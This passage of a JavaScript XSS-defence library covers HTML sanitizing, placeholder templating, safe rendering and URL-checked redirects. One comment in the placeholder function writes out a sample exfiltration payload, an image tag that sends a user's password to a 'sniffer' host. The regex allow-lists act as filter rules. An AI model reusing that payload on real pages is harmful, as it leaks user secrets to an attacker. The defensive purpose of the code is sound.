        var _JSONstringify = JSON.stringify;
        encodeJS.jsonStringify = function() {
          return _JSONstringify.apply(this, arguments).replace(rJSONSpecialChars, function(c) {
            return index[c];
          });
        };
      }

      return encodeJS;
    }());

    var jsonStringify = encodeJS.jsonStringify;

    var replacePlaceholders = function(text, data, encoder) {
      if (data !== undefined && data !== null) {
        if (Object.prototype.toString.apply(data) === '[object Object]') {
          text = convertToString(text).replace(/\{([a-z0-9][a-z0-9.]*)\}/ig, function($0, $1) {
            var path = $1.split('.');
            var name;
            var item = data;
            while ((name = path.shift())) {
              if (item.hasOwnProperty(name)) {
                item = item[name];
              } else {
                warn('Placeholder "' + $1 + '" is invalid');
                item = {};
              }
            }

            if (typeof (item) === 'string' || typeof (item) === 'number') {
              return encoder === undefined ? item : encoder(item);
            } else {
              warn('Placeholder "' + $1 + '" is invalid');
              return '';
            }
          });
        } else {
          text = convertToString(text).replace(/\{([0-9]+)\}/ig, function($0, $1) {
            var item = data[$1];
            if (typeof (item) === 'string' || typeof (item) === 'number') {
              return encoder === undefined ? item : encoder(item);
            } else {
              warn('Placeholder "' + $1 + '" is invalid');
              return '';
            }
          });
        }

        if (debug === 1) {
          convertToString(text).replace(/\{([^{}]*)\}/ig, function($0, $1) {
            warn('Placeholder "' + $1 + '" is invalid');
          });
        }

        // if data contains sensitive data and attacker can insert {placeholder} it means, that this code is vulnerable
        // for example if data contains CSRF token (config object) or user profile with password
        // because of { } chars usually is not encoded to HTML, attacker can insert it in image <img src="http://sniffer/{user.password}" />
        // we will tell them that using array is much faster (they use innerHTML for the same reason some time...)
      }
      return text;
    };

    // for security reason, we don't allow replacePlaceholders without encoders
    var fakeEncoder = function(value) {
      return value;
    };

    /** 
     * Cross-browser version of innerText/textContent
     * @function renderText 
     * @memberof XSS
     * @param {string} text - plain text
     * @param {HTMLElement|string} container - parent element for future text node
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @returns {HTMLElement} element
     */
    var renderText = (function() {
      if (typeof (document) !== 'undefined') {
        if (document.textContent === null) {
          return function renderText(text, container, data) {
            text = replacePlaceholders(text, data, fakeEncoder);
            var element = typeof (container) === 'string' ? document.getElementById(container) : container;
            element.textContent = text;
            return element;
          };
        } else {
          return function renderText(text, container, data) {
            text = replacePlaceholders(text, data, fakeEncoder);
            var element = typeof (container) === 'string' ? document.getElementById(container) : container;
            element.innerText = text;
            return element;
          };
        }
      }
    }());

    var fetchTextFromElements = function(elements) {
      var text = '';

      for ( var i = 0, element; (element = elements[i]); i++) {
        if (element.nodeType === 3 || element.nodeType === 4) {
          text += element.nodeValue;
        } else if (element.nodeType !== 8) {
          text += fetchTextFromElements(element.childNodes);
        }
      }

      return text;
    };

    /** 
     * Get element&#8217;s textContent
     * @function fetchText 
     * @memberof XSS
     * @param {HTMLElement|string} container - target for textContent
     * @returns {string} text
     */
    var fetchText = function fetchText(container) {
      var text;
      container = typeof (container) === 'string' ? document.getElementById(container) : container;
      if (container.tagName && container.tagName.toUpperCase() === 'SCRIPT') {
        return container.text;
      } else {
        if ((text = container.textContent) !== undefined) {
          return text;
        } else if ((text = container.innerText) !== undefined) {
          return text;
        } else {
          return fetchTextFromElements([container]);
        }
      }
    };

    /** 
     * Regular Expressions which defines allowed tags and attributes with values
     */
    var sanitizeAliasedHTMLConfig = {
      allowedTags: ['a', 'area', 'audio', 'b', 'button', 'big', 'blockquote', 'br', 'code', 'div', 'font', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr', 'i', 'input', 'img', 'label', 'li', 'map', 'marquee', 'nobr', 'ol', 'optgroup', 'option', 'p', 'pre', 'q', 's', 'select', 'small', 'source', 'span', 'strike', 'strong', 'sub', 'sup', 'table', 'tbody', 'td', 'textarea', 'tfoot', 'th', 'thead', 'tr', 'u', 'ul', 'video', 'wbr'],
      aliasAttributes: ['rel', 'style', 'target', 'for', 'flashvars', 'classid', 'data', 'action', 'formaction', 'quality', 'scale', 'wmode', 'salign', 'background', 'allowfullscreen', 'allowscriptaccess', 'allownetworking', 'codebase'], // is not allowed without additional checks, add prefix alias-
      allowedAttributes: ['marginwidth', 'marginheight', 'id', 'name', 'hreflang', 'checked', 'frameborder', 'border', 'scrolling', 'seamless', 'class', 'href', 'src', 'alt', 'title', 'type', 'method', 'height', 'width', 'value', 'cols', 'colspan', 'color', 'controls', 'coords', 'dir', 'disabled', 'enctype', 'hidden', 'label', 'loop', 'maxlength', 'multiple', 'pattern', 'preload', 'readonly', 'required', 'reversed', 'rows', 'rowspan', 'sandbox', 'spellcheck', 'usemap', 'data-\\w+',
          'alias-\\w+', 'alias', 'typography'],
      urlAttributes: ['src', 'href', 'action', 'formaction', 'poster'],
      allowedURL: '[#/.?0-9]|&#x23;|&#35;|&#x2f;|&#47;|&#x2e;|&#46;|&#x3f;|&#63;|(?:mailto|http|ftp)|about:blank|data:image/(?:gif|jpg|jpeg|png);base64,|feed:https?://'
    };

    var sanitizeHTMLConfig = {
      allowedTags: sanitizeAliasedHTMLConfig.allowedTags,
      aliasAttributes: null,
      allowedAttributes: ['for', 'rel', 'target', 'action', 'id', 'name'].concat(sanitizeAliasedHTMLConfig.allowedAttributes),
      urlAttributes: sanitizeAliasedHTMLConfig.urlAttributes,
      allowedURL: sanitizeAliasedHTMLConfig.allowedURL
    };

    var prepareRules = function(config) {
      return {
        allowedTagsRE: config.allowedTags === null ? null : new RegExp('<(?=/?(?:' + config.allowedTags.join('|') + ')(?:/?>|[ \\r\\n\\t][^<]*?>))', 'ig'),
        aliasAttributesRE: config.aliasAttributes === null ? null : new RegExp('([ \\n\\t])(' + config.aliasAttributes.join('|') + ')(?=[ \\r\\n\\t]*=[ \\r\\n\\t]*[\'"][^<]+?>)', 'ig'),
        allowedAttributesRE: config.allowedAttributes === null ? null : new RegExp('([ \\n\\t](?:' + config.allowedAttributes.join('|') + ')[ \\r\\n\\t]*)=(?=[ \\r\\n\\t]*[\'"][^<]+?>)', 'ig'),
        urlAttributesRE: config.urlAttributes === null ? null : new RegExp('([ \\n\\t](?:' + config.urlAttributes.join('|') + ')[ \\r\\n\\t]*=[ \\r\\n\\t]*[\'"][ \\r\\n\\t]*)(?![ \\r\\n\\t]*(:?' + config.allowedURL + '))', 'ig')
      };
    };

    /** 
     * Adds alias- prefix to not whitelisted tags and blacklisted attributes with values, allows whitelisted tags and attributes with values, replaces = to &amp;#61; and &lt; to &amp;lt; if it not in white or blacklist. Adds ./ to all URL-attributes which not started from whitelisted protocols.
     * @function sanitizeAliasedHTML
     * @memberof XSS
     * @param {string} html - any HTML which should be sanitized
     * @param {string} rules - object created by prepareRules(sanitizeAliasedHTMLConfig)
     * @returns {string} sanitized HTML
     */
    // sanitizeHTML must allow as many as possible and prevent XSS
    // never use this function with concatenation to trusted markup, like x.innerHTML = sanitizeHTML(untrustedHTML) + trustedHTML;
    // it can be used only like x.innerHTML = sanitizeHTML(untrustedHTML);
    var sanitizeAliasedHTML = function(html, rules) {
      var sanitizedHTML = html.replace(/\u0000/g, '\ufffd')
      // if < is not part of allowed tag we encode it to HTML entity and call warn function
      .replace(rules.allowedTagsRE, '\u0000').replace(/<(\/?)(?=[a-z0-9]+[ \t\r\n>])/ig, '\u0000$1alias-').replace(/</g, function() {
        warn('template contains forbidden tags: ' + html);
        return '&lt;';
      }).replace(/\u0000/g, '<')
      // replaces some attributes like id and name to alias-style
      .replace(rules.aliasAttributesRE, '$1alias-$2')
      // if = is not part of allowed attribute with value we encode it to HTML entity
      .replace(rules.allowedAttributesRE, '$1\u0000').replace(/[=]/g, '&#61;').replace(/\u0000/g, '=')
      // if URL have wrong protocol we insert ./ before link it means, that if this is relative URL it still works <a href="./javascript.html">test</a>
      .replace(rules.urlAttributesRE, '$1./');

      return sanitizedHTML;
    };

    /** 
     * sanitizeHTML similar to sanitizeAliasedHTML but all attributes and tags which is not listed will be plaintext.
     * @function sanitizeHTML
     * @memberof XSS
     * @param {string} html - any HTML which should be sanitized
     * @param {string} rules - object created by prepareRules(sanitizeHTMLConfig)
     * @returns {string} sanitized HTML
     */
    var sanitizeHTML = function(html, rules) {
      var sanitizedHTML = html.replace(/\u0000/g, '\ufffd').replace(rules.allowedTagsRE, '\u0000').replace(/</g, function() {
        warn('template contains forbidden tags: ' + html);
        return '&lt;';
      }).replace(/\u0000/g, '<').replace(rules.allowedAttributesRE, '$1\u0000').replace(/[=]/g, '&#61;').replace(/\u0000/g, '=').replace(rules.urlAttributesRE, '$1./');

      return sanitizedHTML;
    };

    /** 
     * XSS.toStaticHTML sanitizes HTML and prepares it for innerHTML. For concatenation with other HTML better to use purifyHTML which closes all tags.
     * @function toStaticHTML
     * @memberof XSS
     * @param {string} html - any HTML which should be sanitized
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @returns {string} static HTML
     */
    var toStaticHTML = (function() {
      var defaultRules = prepareRules(sanitizeHTMLConfig);
      return function toStaticHTML(html, data, closeTag) {
        if (html === undefined || html === null) {
          warn('html is not defined');
          return null;
        }

        var sanitizedHTML = sanitizeHTML(replacePlaceholders(html, data, encodeHTML), defaultRules);

        return sanitizedHTML + (closeTag === false ? '' : '</x\'"`>');
      };
    }());

    /** 
     * XSS.purifyHTML parses static HTML and returns purified HTML. For Internet Explorer used {@link http://msdn.microsoft.com/en-us/library/ie/cc848922(v=vs.85).aspx|window.toStaticHTML}, which means rules more strict than XSS.toStaticHTML. Because XSS.purifyHTML doing HTML parsing this function slower than XSS.toStaticHTML.
     * @function purifyHTML
     * @memberof XSS
     * @param {string} html - any HTML which should be purified
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @returns {string} sanitized HTML
     */
    var purifyHTML = (function() {
      if (global.toStaticHTML !== undefined) {
        return function(html, data) {
          return global.toStaticHTML(XSS.toStaticHTML(html, data));
        };
      } else {
        if (typeof (document) !== 'undefined') {
          var span = document.createElement(span);
          return function purifyHTML(html, data) {
            var staticHTML;
            span.innerHTML = XSS.toStaticHTML(html, data);
            staticHTML = span.innerHTML;
            span.innerHTML = '';
            return staticHTML;
          };
        }
      }
    }());

    /** 
     * renderAliasedHTML private function which used by renderStaticHTML
     * @function renderAliasedHTML
     * @private
     * @param {string} html - any HTML which should be set as innerHTML to container
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @param {object} rules - object with regular expressions to define sanitization rules (use null for default value)
     * @param {boolean} render - testing param, if it true function returns HTML
     * @returns {HTMLElement} container
     */
    var renderAliasedHTML = (function() {
      var defaultRules = prepareRules(sanitizeAliasedHTMLConfig);

      return function renderAliasedHTML(html, container, data, rules, render) {

        if (html === undefined || html === null) {
          warn('html is not defined');
          return null;
        }

        if (container === undefined || container === null) {
          warn('container is not defined');
          return null;
        }

        if (rules === undefined || rules === null) {
          rules = defaultRules;
        }

        var sanitizedHTML = sanitizeAliasedHTML(replacePlaceholders(html, data, encodeHTML), rules);

        if (render === false) {
          return sanitizedHTML;
        } else {
          container.innerHTML = sanitizedHTML;
          return container;
        }
      };
    }());

    /** 
     * renderUnsafeHTML 
     * @function renderAliasedHTML
     * @private
     * @param {string} trustedHTML - any HTML which should be set as innerHTML to container
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @param {string} reason - any HTML which should be set as innerHTML to container
     * @returns {HTMLElement} container
     */
    var renderUnsafeHTML = function renderUnsafeHTML(trustedHTML, container, data, reason) {
      if (typeof (reason) !== 'string' || reason.length < 50) {
        throw new Error('Using unsafe HTML without reason');
      }
      container.innerHTML = replacePlaceholders(trustedHTML, data, encodeHTML);
      return container;
    };
    // renderUnsafeHTML.use = function(meta) { return renderUnsafeHTML(meta.trustedHTML); };

    var prepareFilters = function(filters) {
      var preparedFilters = {};
      for ( var i = 0, name, filter; i < filters.length; i++) {
        filter = filters[i];
        preparedFilters[filter.name] = filter;

        if (filter.attributes !== undefined) {
          for ( var k = 0; k < filter.attributes.length; k++) {
            var selector = [];
            for ( var j = 0; j < filter.tags.length; j++) {
              selector.push(filter.tags[j] + '[' + filter.attributes[k] + ']');
            }
            if (selector.length > 0) {
              if (filter.selectors === undefined) {
                filter.selectors = [];
              }
              filter.selectors.push(selector.join(','));
            }
          }
        }
      }

      return preparedFilters;
    };

    /** 
     * XSS.renderStaticHTML sanitize HTML and sets innerHTML to container.
     * @function renderStaticHTML
     * @memberof XSS
     * @param {string} html - any HTML which should be set to container
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     * @param {object} rules - object with regular expressions to define sanitization rules (use null for default value)
     * @param {array} filters - array of handlers for some specific tags (use null for default value)
     * @param {object} aliases - empty object which can be defined to collect elements by id, name or special attribute alias (alias is the same as id but not global, can be used to access to element without id)
     * @param {array} listeners - event listeners {alias:{click:function(event){ alert(1); return false; }}}
     * @param {object} params - configuration object which can be accessed by filters
     * @param {boolean} render - testing param, if it true function returns HTML
     * @returns {HTMLElement} container
     */
    var renderStaticHTML = (function() {

      // var filters = ['href', 'url', 'alias', 'target', 'label', 'style'];
      var defaultFilters = [{
        'name': 'href', // Filter link urls
        'tags': ['a', 'area'],
        'attributes': ['href'],
        'parsed': true, // a.getAttribute('href') is original value, we need parsed a.href
        'delayed': true,
        'allowedAttributeValue': '^[ \\t\\r\\n]*(?:(?:https?|ftp|mailto):|[/.#?])'
      }, {
        'name': 'url', // Filter link urls
        'tags': ['form', 'button', 'audio', 'video', 'input', 'source'],
        'attributes': ['src', 'href', 'action', 'formaction', 'poster'],
        'parsed': true,
        'delayed': true, // iframe is not allowed in static html we have filter for it in embed filters, poster in video works only in old Opera
        'allowedAttributeValue': '^[ \\t\\r\\n]*(?:(?:(?:https?|ftp)://|[/.#?])|$)'
      }, {
        'required': function(element, attributeName, attributeValue, aliases, listeners, params) {
          return aliases || listeners;
        },
        'name': 'alias',
        'tags': ['*'],
        'attributes': ['alias', 'id', 'name'],
        'delayed': false,
        'handler': function(element, attributeName, attributeValue, aliases, listeners, params) {
          if (/^[a-z0-9\-][a-z0-9\-_]*$/i.test(attributeValue) && !/^alias-/i.test(element.tagName)) {
            aliases[attributeValue] = element;
          } else {
            warn('Can\u2019t set alias for ' + element.tagName + ' to ' + attributeValue);
          }
          return attributeValue;
        }
      }, {
        'name': 'target',
        'tags': ['a', 'area', 'form'],
        'attributes': ['alias-target'],
        'delayed': true,
        'allowAliasAttributeValue': '^_blank$'
      }, {
        'name': 'label',
        'tags': ['label'],
        'attributes': ['alias-for'],
        'delayed': true,
        'allowAliasAttributeValue': ''
      }, {
        'name': 'style',
        'tags': ['*'],
        'attributes': ['alias-style'],
        'delayed': true,
        'handler': function(element, attributeName, attributeValue) {
          var rules = [];
          attributeValue.replace(/(?:^|[ \t\r\n;])([a-z0-9\-]+)[ \t\r\n]*:[ \t\r\n]*([a-z0-9 %#,.\-]+)[ \t\r\n]*(?=;|$)/ig, function(match, name, value) {
            rules.push(name + ': ' + value + ';');
          });
          element.setAttribute('style', rules.join(' '));
        }
      }, {
        'name': 'rel',
        'tags': ['a', 'area'],
        'delayed': true,
        'handler': function(element, aliases, listeners, params) {
          if (params.noreferrer !== false && element.getAttribute('target') === '_blank') {
            element.setAttribute('rel', 'noreferrer');
          }
        }
      }];

      var preparedFilters = prepareFilters(defaultFilters);

      var filterAttribute = function(filter, element, attributeName, aliases, listeners, params) {

        var attributeValue = filter.parsed === true ? element[attributeName] : element.getAttribute(attributeName);
        if (attributeValue !== null || attributeValue !== undefined) {
          if (typeof (attributeValue) === 'string') {
            if (typeof (filter.handler) === 'function') {
              attributeValue = filter.handler(element, attributeName, attributeValue, aliases, listeners, params);
              if (attributeValue === undefined) {
                if (filter.parsed === true) {
                  element[attributeName] = undefined;
                } else {
                  element.removeAttribute(attributeName);
                }
              } else {
                if (filter.parsed === true) {
                  element[attributeName] = attributeValue;
                } else {
                  element.setAttribute(attributeName, attributeValue);
                }
              }
            }

            if (typeof (filter.allowAliasAttributeValue) === 'string') {
              if (attributeValue.match(new RegExp(filter.allowAliasAttributeValue)) !== null) {
                element.setAttribute(attributeName.replace(/^alias-/, ''), attributeValue);
                element.removeAttribute(attributeName);
              } else {
                warn('Attribute ' + attributeName.replace(/^alias-/, '') + ' for ' + element.tagName + ' Can\u2019t be set to "' + attributeValue + '": ' + filter.allowAliasAttributeValue);
              }
            }

            if (typeof (filter.allowedAttributeValue) === 'string') {
              if (attributeValue.match(new RegExp(filter.allowedAttributeValue, 'i')) === null) {
                if (filter.parsed === true) {
                  element[attributeName] = undefined;
                }
                element.removeAttribute(attributeName);
                warn('Attribute ' + attributeName + ' for ' + element.tagName + ' Can\u2019t be set to "' + attributeValue + '": ' + filter.allowedAttributeValue);
              }
            }
          }
        }
      };

      var applyFilter = function(container, filter, aliases, listeners, params) {
        if (typeof filter.required !== 'function' || filter.required(container, filter, aliases, listeners, params)) {
          if (filter.selectors !== undefined && !quirks) {
            eachItem(filter.selectors, function(selector, i) {
              var attributeName = filter.attributes[i];
              eachElement(container.querySelectorAll(selector), function(element) {
                filterAttribute(filter, element, attributeName, aliases, listeners, params);
              });
            });
          } else {
            eachItem(filter.tags, function(tag) {
              eachElement(container.getElementsByTagName(tag), function(element) {
                if (filter.attributes !== undefined) {
                  eachItem(filter.attributes, function(attributeName) {
                    filterAttribute(filter, element, attributeName, aliases, listeners, params);
                  });
                } else {
                  if (typeof (filter.handler) === 'function') {
                    filter.handler(element, aliases, listeners, params);
                  } else {
                    warn('Filter handler must be function');
                  }
                }
              });
            });
          }
        }
      };

      var quirks = false;
      if (typeof (document) !== 'undefined') {
        var container = document.createElement('div');
        container.innerHTML = '<alias-x>'; // IE7/8
        if (container.innerHTML === '') {
          quirks = true;
        }
        if (document.querySelectorAll === undefined || container.querySelectorAll('alias-x').length !== 1) {
          quirks = true;
        }
      }

      return function renderStaticHTML(html, container, data, rules, filters, aliases, listeners, params, render) {

        var returnFirstChild = false;
        if (container === undefined || container === null) {
          if (document.implementation !== undefined && document.implementation.createHTMLDocument !== undefined) {
            container = document.implementation.createHTMLDocument('sandbox').body;
          } else {
            container = document.createElement('div');
          }
          returnFirstChild = true;
        } else if (typeof (container) === 'string') {
          container = document.getElementById(container);
        }

        if (quirks) {
          html = ' ' + html;
        }

        if (aliases === undefined) {
          aliases = {};
        }

        if (params === undefined) {
          params = {};
        }

        if (render === false && debug === 1) {
          return renderAliasedHTML(html, container, data, rules, false);
        } else {
          renderAliasedHTML(html, container, data, rules, true);
        }

        if (filters === undefined || filters === true) {
          filters = defaultFilters;
        }

        if (filters !== null) {
          var delayedFilters = [];

          eachItem(filters, function(filter) {
            if (typeof (filter) === 'string') {
              if (typeof (preparedFilters[filter]) === 'object') {
                filter = preparedFilters[filter];
              } else {
                warn('Default filter with name "' + filter + '" is not found');
              }
            }

            if (filter.delayed === true) {
              delayedFilters.push(filter);
            } else {
              applyFilter(container, filter, aliases, listeners, params);
            }
          });

          if (delayedFilters.length > 0) {
            setTimeout(function() {
              eachItem(delayedFilters, function(delayedFilter) {
                applyFilter(container, delayedFilter, aliases, listeners, params);
              });

              eachProperty(listeners, function(listener, aliasName) {
                var alias = aliases[aliasName];
                addEventListeners(alias, listeners[aliasName]);
                if (listener.render !== undefined) {
                  listener.render({
                    target: alias
                  });
                }
              });
            }, 1);
          } else {
            eachProperty(listeners, function(listener, aliasName) {
              var alias = aliases[aliasName];
              if (listener.render !== undefined) {
                listener.render({
                  target: alias
                });
              }
            });
          }

        }

        return returnFirstChild ? (container.firstElementChild || container.children[0]) : container;
      };

    }());

    /** 
     * Read innerHTML of container
     * @function fetchHTML
     * @memberof XSS
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @returns {string} HTML
     */
    var fetchHTML = function fetchHTML(container) {
      return (typeof (container) === 'string' ? document.getElementById(container) : container).innerHTML;
    };

    /** 
     * Same as document.write, but HTML is sanitized
     * @function writeHTML
     * @memberof XSS
     * @param {string} html - HTML
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     */
    var writeHTML = function writeHTML(html, container, data) {
      (container || document).write(purifyHTML(html, data));
    };

    /** 
     * Same as document.write, HTML is not sanitized
     * @function writeUnsafeHTML
     * @memberof XSS
     * @param {string} html - HTML
     * @param {HTMLElement} container - HTMLElement or ID of element
     * @param {object|array} data - use {foo.bar} as placeholder for data object {foo:{bar:'text'}}
     */
    var writeUnsafeHTML = function writeUnsafeHTML(trustedHTML, data, reason) {
      if (typeof (reason) !== 'string' || reason.length < 50) {
        throw new Error('Using unsafe HTML without reason');
      }
      window.document.write(replacePlaceholders(trustedHTML, data, encodeHTML));
    };

    /** 
     * Internet Explorer have specific feature, all URLs which used in location.href HTML decoded before use. This function encodes URL if it Internet Explorer.
     * @function encodeURLToHTMLForIE
     * @private
     * @param {string} url - HTML
     * @returns {string} HTML encoded URL
     */
    var encodeURLToHTMLForIE = function(url) {
      /*
       * @cc_on
       * 
       * @if (@_jscript_version <= 10) (function() { url = encodeHTML(url); }())
       * 
       * @end @
       */

      return url;
    };

    /** 
     * Equivalent to location.href = url, but URL checked before use.
     * @function redirect
     * @memberof XSS
     * @param {string} url - HTML
     */
    var redirect = function(url, params) {
      var a = document.createElement('a');
      a.setAttribute('rel', 'noreferrer');
      a.setAttribute('href', sanitizeURI(url, params));
      if (a.protocol === 'http:' || a.protocol === 'https:') {
        document.body.appendChild(a);
        if (a.click !== undefined) {
          a.click();
        } else {
          location.href = encodeURLToHTMLForIE(a.href);
        }
        a.parentNode.removeChild(a);
      }
    };

    /** 
     * Equivalent to window.open(url), but URL checked before use.
     * @function open
     * @memberof XSS
     * @param {string} url - HTML
     */
    var _open = global.open;
    var open = function(url, name, features, params) {
      var a = document.createElement('a');
      a.setAttribute('rel', 'noreferrer');
      a.setAttribute('href', sanitizeURI(url, params));
      if (a.protocol === 'http:' || a.protocol === 'https:') {
        return _open(encodeURLToHTMLForIE(a.href), name, features);
      }
    };

    // object to attributes mappers
    renderUnsafeHTML.use = function(meta) {
      return renderUnsafeHTML.apply(global, [meta.trustedHTML, meta.container, meta.data, meta.reason]);
    };
    renderStaticHTML.use = function(meta) {
      return renderStaticHTML.apply(global, [meta.html, meta.container, meta.data, meta.rules, meta.filters, meta.aliases, meta.listeners, meta.params, meta.render]);
    };
    writeHTML.use = function(meta) {
      return writeHTML.apply(global, [meta.html, meta.data, meta.container]);
    };
    writeUnsafeHTML.use = function(meta) {
      return writeUnsafeHTML.apply(global, [meta.html, meta.data, meta.reason]);
    };

    XSS.sanitize = sanitize;
    XSS.desanitize = desanitize;
    XSS.toStaticHTML = toStaticHTML;
    XSS.decodeHTML = decodeHTML;
    XSS.encodeHTML = encodeHTML;
    XSS.encodeJS = encodeJS;
    XSS.jsonStringify = jsonStringify;
    if (typeof (window) !== 'undefined') {
      XSS.warn = warn;
      XSS.setDebug = setDebug;
      XSS.encodeURIComponent = encodeURIComponent;
      XSS.dataValidators = dataValidators;
      XSS.URL = URL;
      XSS.parseURL = parseURL;
      XSS.sanitizeURL = sanitizeURL;
      XSS.sanitizeURI = sanitizeURI;
      XSS.hideParameter = hideParameter;
      XSS.renderText = renderText;
      XSS.fetchText = fetchText;
      XSS.purifyHTML = purifyHTML;
      XSS.renderAliasedHTML = renderAliasedHTML;
      XSS.renderUnsafeHTML = renderUnsafeHTML;
      XSS.renderStaticHTML = renderStaticHTML;
      XSS.fetchHTML = fetchHTML;
      XSS.writeHTML = writeHTML;
      XSS.writeUnsafeHTML = writeUnsafeHTML;
      XSS.open = open;
      XSS.redirect = redirect;
    }

    return XSS;
  }(typeof (exports) === 'undefined' ? {} : exports));

  //if (typeof(define) !== 'undefined') {
  //  define(function () {
  //    return XSS;
  //  });
  //}

  global.XSS = XSS;

}(typeof (global) !== 'undefined' && typeof (window) === 'undefined' ? global : window));